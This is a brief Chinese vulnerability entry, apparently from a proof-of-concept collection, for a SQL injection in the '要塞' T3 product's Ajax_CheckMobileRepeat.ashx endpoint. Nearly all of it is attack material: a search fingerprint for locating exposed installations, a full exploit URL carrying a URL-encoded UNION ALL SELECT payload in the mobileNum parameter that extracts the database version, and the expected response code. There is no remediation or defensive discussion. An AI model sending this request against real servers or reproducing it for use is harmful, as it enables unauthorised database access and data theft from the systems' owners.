# 要塞T3Ajax_CheckMobileRepeat存在SQL注入漏洞

要塞 ｜ SQL注入 ｜ —
- **指纹**：`body="/mlogin.htm?url="`
- **请求**：`http://ip/T3/Ajax/Ajax_CheckMobileRepeat.ashx?action=checkmobilerepeat&mobileNum=1%27%20UNION%20ALL%20SELECT%20NULL%2C%28SELECT%20%40%40version%29--%20aEdt`
- **响应特征**：200